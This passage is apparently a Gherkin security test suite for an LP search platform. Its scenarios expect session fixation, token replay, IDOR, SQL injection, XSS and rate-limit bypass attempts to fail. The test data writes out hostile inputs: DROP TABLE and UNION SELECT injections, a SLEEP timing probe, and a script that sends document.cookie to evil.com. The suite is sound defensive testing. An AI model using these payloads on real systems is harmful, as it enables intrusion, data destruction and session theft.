    And I can find it in my saved searches

  # --- NEGATIVE E2E SCENARIOS ---
  Scenario: Registration fails at each step
    # Registration with existing email
    Given I am on the homepage
    When I click "Get Started"
    And I enter email "existing@venture.com"
    Then I see "This email is already registered"
    And I can try different email

    # Password too weak
    When I enter email "new@venture.com"
    And I enter weak password
    Then I see password requirements
    And I must enter stronger password

    # Network error during registration
    When I enter valid details
    And I click "Register"
    And network fails
    Then I see "Connection error, please try again"
    And my form data is preserved

  Scenario: Verification link issues
    # Link expired
    Given I registered 48 hours ago
    When I click the verification link
    Then I see "Link expired"
    And I request new verification email
    And I receive new email
    And I can verify with new link

  Scenario: Login issues after verification
    # Wrong password
    Given I verified my email
    When I enter wrong password
    Then I see "Invalid email or password"
    And I can try again

    # Forgot password flow
    When I click "Forgot password"
    And I enter my email
    Then I receive reset email
    And I can reset and login

  Scenario: Session expiry during search
    Given I am logged in and searching LPs
    And I apply several filters
    When my session expires
    And I try to save search
    Then I am redirected to login
    And after login I return to search
    And my filter state is preserved (or I see message)

  Scenario: Error handling during LP search
    # No results found
    Given I am logged in
    When I search for "NonExistentLP12345"
    Then I see "No LPs found"
    And I see suggestions to modify search

    # Server error during search
    Given the LP database is temporarily unavailable
    When I try to search
    Then I see "Unable to search right now"
    And I see "Try again" button
    And the page remains functional
```

---

## Security Test Suite

```gherkin
Feature: Security Tests
  As a platform
  I want to ensure security best practices
  So that user data is protected

  # --- Authentication Security ---
  Scenario: Passwords are hashed, not stored in plaintext
    Given I register with password "SecurePass123!"
    When I query the database directly
    Then I do not see "SecurePass123!" in any field
    And I see a hashed value

  Scenario: Session tokens are secure
    Given I am logged in
    When I examine my session cookie
    Then it has HttpOnly flag
    And it has Secure flag (in production)
    And it has SameSite attribute

  Scenario: Password not in logs
    Given I login with password "SecurePass123!"
    When I examine application logs
    Then I do not see the password in any log entry

  Scenario: Timing attack prevention on login
    When I login with non-existent email "fake@test.com"
    And I measure response time
    And I login with existing email but wrong password
    And I measure response time
    Then response times are similar (within 100ms)

  Scenario: Password reset token is single-use
    Given I received a password reset email
    When I use the reset link successfully
    And I try to use it again
    Then the second attempt fails
    And I see "Reset link already used"

  # --- Authorization Security ---
  Scenario: JWT token tampering detection
    Given I have a valid session token
    When I modify the payload section of the token
    And I send request with modified token
    Then I receive 401 Unauthorized
    And my session is invalidated

  Scenario: Expired token rejection
    Given I have a session token that expired
    When I send request with expired token
    Then I receive 401 Unauthorized
    And I am redirected to login

  Scenario: Token issued by different key rejected
    Given I have a token signed with different secret
    When I send request with this token
    Then I receive 401 Unauthorized

  # --- Input Validation Security ---
  Scenario: XSS prevention in all user inputs
    When I enter "<script>alert('xss')</script>" in:
      | Field |
      | Name |
      | Fund Name |
      | Search Query |
      | Saved Search Name |
    Then the script tag is escaped or stripped
    And no JavaScript executes on page render

  Scenario: CSRF protection on state-changing requests
    Given I am logged in
    When I try to submit a form without CSRF token
    Then the request is rejected
    And I see "Invalid request"

  Scenario: File upload validation (if applicable)
    Given I try to upload a file
    When the file is named "malware.exe.pdf"
    Or the file contains executable content
    Then the upload is rejected
    And I see appropriate error message

  # --- Rate Limiting ---
  Scenario: Login rate limiting
    When I attempt login 10 times in 1 minute
    Then I am rate limited
    And I see "Too many attempts, please wait"

  Scenario: API rate limiting
    When I make 1000 API requests in 1 minute
    Then I am rate limited
    And I receive 429 Too Many Requests

  Scenario: Password reset rate limiting
    When I request 5 password resets in 5 minutes
    Then I am rate limited
    And further requests are rejected

  # --- Data Protection ---
  Scenario: Sensitive data not in error messages
    When a database error occurs
    Then the error message shown to user is generic
    And database details are not exposed
    And stack traces are not shown in production

  Scenario: API responses do not leak sensitive data
    When I request my user profile via API
    Then password hash is not included
    And internal IDs are not exposed if not needed
    And other users' data is not included

  Scenario: HTTPS enforcement
    Given I am in production environment
    When I try to access HTTP URL
    Then I am redirected to HTTPS
    And all resources load via HTTPS

  # ===========================================================
  # NEGATIVE SECURITY TEST SCENARIOS
  # ===========================================================
  # These tests verify protection against specific attack vectors
  # Tags: @negative @security

  # --- Session Fixation Attack Prevention ---
  @negative @security
  Scenario: Session fixation attack - attacker sets session before login
    Given an attacker knows the session cookie name
    And the attacker sets a session cookie "malicious-session-id" in my browser
    When I successfully login with valid credentials
    Then a completely new session ID is generated
    And the pre-set "malicious-session-id" is discarded
    And the attacker cannot hijack my session using their known ID

  @negative @security
  Scenario: Session fixation via URL parameter injection
    Given an attacker sends me a link with session ID in URL
    When I click the link and login
    Then the URL session parameter is ignored
    And a new server-generated session ID is used
    And my session is not fixated to the attacker's ID

  @negative @security
  Scenario: Session fixation via meta refresh or redirect
    Given an attacker page attempts to set my session via redirect
    When I navigate away and login to lpxgp.com
    Then cross-origin session manipulation is blocked
    And a fresh session ID is generated on successful login

  @negative @security
  Scenario: Session ID regeneration on privilege escalation
    Given I am logged in as a Member
    When my role is upgraded to Admin
    Then my session ID is regenerated
    And the old session ID cannot be used to access Admin features

  @negative @security
  Scenario: Session fixation through subdomain cookie
    Given an attacker controls a subdomain (e.g., malicious.lpxgp.com)
    And they set a session cookie scoped to .lpxgp.com
    When I login to lpxgp.com
    Then the subdomain cookie is rejected or overwritten
    And a new secure session is established

  # --- Token Replay Attack Prevention ---
  @negative @security
  Scenario: Replay of captured authentication token
    Given I logged in and my session token was intercepted
    When I logout
    And the attacker replays the captured token
    Then the token is rejected as invalidated
    And the attacker receives 401 Unauthorized

  @negative @security
  Scenario: Replay of password reset token
    Given I received a password reset email
    And I successfully reset my password
    When the same reset token is replayed (by attacker or me)
    Then the token is rejected as already used
    And I see "Reset link already used"

  @negative @security
  Scenario: Replay of invitation token
    Given I accepted an invitation and created my account
    When the same invitation token is replayed
    Then the token is rejected as already consumed
    And no duplicate account can be created

  @negative @security
  Scenario: Replay of old session token after password change
    Given I captured my current session token
    When I change my password
    And the old token is replayed
    Then the old token is rejected
    And I must re-authenticate with new credentials

  @negative @security
  Scenario: Replay of token from different IP address
    Given I logged in from IP 1.2.3.4
    When my token is replayed from IP 5.6.7.8
    Then the system detects IP mismatch (if IP binding enabled)
    And additional verification may be required
    And the replay attempt is logged

  @negative @security
  Scenario: Replay of verification email token
    Given I verified my email address
    When the verification token is replayed
    Then the token is rejected as already used
    And my account status is not affected

  @negative @security
  Scenario: Token with future timestamp (clock skew attack)
    Given an attacker creates a token with future expiry timestamp
    When the token is submitted to the API
    Then the token is rejected due to invalid timestamp
    And the attempt is logged for security review

  @negative @security
  Scenario: Concurrent session token usage detection
    Given I have an active session token
    When the same token is used simultaneously from two locations
    Then the system detects concurrent usage
    And may invalidate both sessions requiring re-auth
    And I receive security alert notification

  # --- IDOR Prevention (Accessing Other Company's Data) ---
  @negative @security
  Scenario: IDOR on user profile endpoint
    Given I am authenticated as user "user-123" from "Acme Capital"
    And "Other Firm" has user "user-456"
    When I request "/api/users/user-456/profile"
    Then I receive 404 Not Found
    And no user data from Other Firm is exposed

  @negative @security
  Scenario: IDOR via UUID enumeration
    Given I am authenticated from "Acme Capital"
    When I iterate through predictable UUIDs for resources
    Then I only receive data for resources owned by Acme Capital
    And other company resources return 404

  @negative @security
  Scenario: IDOR on batch operations
    Given I am from "Acme Capital"
    When I send batch request with IDs from multiple companies
    Then only Acme Capital resources are processed
    And other company resource IDs are ignored or return 404
    And partial success is clearly reported

  @negative @security
  Scenario: IDOR via export functionality
    Given I am from "Acme Capital"
    When I try to export by manipulating resource IDs in request
    Then export only includes Acme Capital data
    And other company data is not included

  @negative @security
  Scenario: IDOR through GraphQL query (if applicable)
    Given I am authenticated from "Acme Capital"
    When I craft GraphQL query to access other company's nested data
    Then RLS policies block cross-company access
    And only authorized data is returned

  @negative @security
  Scenario: IDOR via object reference in file download
    Given "Acme Capital" has file "report-123.pdf"
    And "Other Firm" has file "report-456.pdf"
    When I try to download "/files/report-456.pdf"
    Then I receive 404 Not Found
    And the file from Other Firm is not accessible

  @negative @security
  Scenario: IDOR using sequential/predictable IDs
    Given resources have sequential integer IDs
    When I access my resource at "/api/resource/100"
    And I try to access "/api/resource/99" (another company)
    Then I receive 404 Not Found
    And no information leakage occurs

  @negative @security
  Scenario: IDOR through webhook or callback manipulation
    Given I configure a webhook for my fund events
    When I try to set webhook to receive other company's events
    Then the webhook only receives Acme Capital events
    And cross-company event subscription is blocked

  # --- SQL Injection Prevention ---
  @negative @security
  Scenario: SQL injection in login email field
    When I attempt login with email "admin'--"
    And password "anything"
    Then I receive "Invalid email or password"
    And no SQL injection occurs
    And the attempt is logged

  @negative @security
  Scenario: SQL injection in search ORDER BY clause
    When I send search request with sort="name; DROP TABLE lps;--"
    Then the sort parameter is validated against whitelist
    And malicious SQL is not executed
    And default sorting is applied

  @negative @security
  Scenario: SQL injection via UNION-based attack
    When I search for "' UNION SELECT password FROM users--"
    Then parameterized queries prevent injection
    And no password data is returned
    And the attempt is logged

  @negative @security
  Scenario: Blind SQL injection via timing attack
    When I search for "' OR IF(1=1, SLEEP(5), 0)--"
    Then the search completes normally (no delay)
    And injection is prevented by parameterized queries

  @negative @security
  Scenario: SQL injection in JSON body fields
    When I POST fund creation with name "Fund'; DROP TABLE funds;--"
    Then the input is properly escaped/parameterized
    And the fund is created with literal name (or rejected)
    And database integrity is maintained

  @negative @security
  Scenario: Second-order SQL injection
    Given I created a fund with name "'; DROP TABLE lps;--"
    When the fund name is used in another query later
    Then the stored value is still safely parameterized
    And no injection occurs on retrieval

  @negative @security
  Scenario: SQL injection in array/list parameters
    When I send filter request with types=["Public Pension'; DELETE FROM users;--"]
    Then the array elements are safely parameterized
    And no SQL injection occurs

  @negative @security
  Scenario: SQL injection via HTTP headers
    When I send request with X-Custom-Header: "'; DROP TABLE sessions;--"
    Then headers are not used in SQL queries
    Or they are safely sanitized if used

  # --- XSS Prevention in User Input Fields ---
  @negative @security
  Scenario: Stored XSS in fund name
    When I create a fund with name "<img src=x onerror=alert('xss')>"
    And another user views the fund
    Then the HTML is escaped in output
    And no JavaScript executes for the viewer

  @negative @security
  Scenario: Reflected XSS in search query
    When I search for "<script>document.location='evil.com?c='+document.cookie</script>"
    And results are displayed
    Then the script tag is escaped in the response
    And no script executes

  @negative @security
  Scenario: DOM-based XSS via URL fragment
    When I navigate to "/search#<img src=x onerror=alert(1)>"
    Then client-side code safely handles fragment
    And no script executes

  @negative @security
  Scenario: XSS via SVG upload (if applicable)
    When I try to upload avatar with SVG containing "<script>alert('xss')</script>"
    Then the upload is rejected
    Or SVG is sanitized to remove script elements

  @negative @security
  Scenario: XSS in user display name rendering
    Given I set my name to "<b onmouseover=alert(1)>Hover me</b>"
    When my name is displayed on any page
    Then the HTML tags are escaped
    And event handlers are not executed

  @negative @security
  Scenario: XSS via JSON response manipulation
    When I inject "</script><script>alert(1)</script>" in a field
    And the server includes it in JSON response
    Then proper JSON encoding prevents script execution
    And Content-Type header is application/json

  @negative @security
  Scenario: XSS via error message reflection
    When I cause an error with input "<script>alert('xss')</script>"
    And the error message includes my input
    Then the error message is properly escaped
    And no script executes

  @negative @security
  Scenario: XSS via markdown rendering (if applicable)
    When I enter "[Click me](javascript:alert('xss'))" in a markdown field
    Then javascript: URLs are sanitized
    And the link does not execute JavaScript

  @negative @security
  Scenario: XSS via CSS injection
    When I enter "background: url('javascript:alert(1)')" in a style field
    Then CSS injection is prevented
    And no JavaScript executes via CSS

  @negative @security
  Scenario: XSS header injection (Content-Type manipulation)
    When I send request with malformed Accept header to inject script
    Then server response maintains proper Content-Type
    And no script execution occurs

  # --- Rate Limiting Bypass Attempts ---
  @negative @security
  Scenario: Rate limit bypass via IP rotation
    Given I hit rate limit from IP 1.2.3.4
    When I continue requests from IP 1.2.3.5 with same user account
    Then rate limit applies per user account, not just IP
    And I remain rate limited

  @negative @security
  Scenario: Rate limit bypass via header manipulation
    When I send requests with X-Forwarded-For: "new-ip-each-time"
    Then the server uses real client IP, not forwarded header
    And rate limit cannot be bypassed via header spoofing

  @negative @security
  Scenario: Rate limit bypass via User-Agent rotation
    Given I hit rate limit
    When I change User-Agent header on each request
    Then rate limit is based on IP/session, not User-Agent
    And I remain rate limited

  @negative @security
  Scenario: Rate limit bypass via case variation in endpoint
    Given I hit rate limit on "/api/login"
    When I try "/API/LOGIN" or "/Api/Login"
    Then endpoint comparison is case-insensitive
    And rate limit still applies

  @negative @security
  Scenario: Rate limit bypass via URL encoding
    Given I hit rate limit on "/api/search"
    When I try "/%61%70%69/%73%65%61%72%63%68" (URL encoded)
    Then URL is decoded before rate limit check
    And rate limit still applies

  @negative @security
  Scenario: Rate limit bypass via trailing slash
    Given I hit rate limit on "/api/login"
    When I try "/api/login/"
    Then routes are normalized
    And rate limit still applies

  @negative @security
  Scenario: Rate limit bypass via HTTP method change
    Given I hit rate limit for POST /api/login
    When I try other HTTP methods (GET, PUT, OPTIONS)
    Then rate limit applies across relevant methods
    And I cannot bypass by method switching

  @negative @security
  Scenario: Rate limit counter reset manipulation
    Given I hit rate limit
    When I wait exactly at the limit reset time
    And I send burst of requests at reset moment
    Then rate limit handles edge case correctly
    And I cannot exploit timing window

  @negative @security
  Scenario: Distributed rate limit bypass (multiple sessions)
    Given I create 10 different sessions
    When I distribute requests across all sessions
    Then per-user rate limit aggregates all sessions
    And combined requests still trigger rate limit

  @negative @security
  Scenario: Rate limit bypass via API version change
    Given I hit rate limit on "/api/v1/login"
    When I try "/api/v2/login" (if exists)
    Then rate limit applies across API versions
    And I remain rate limited
```
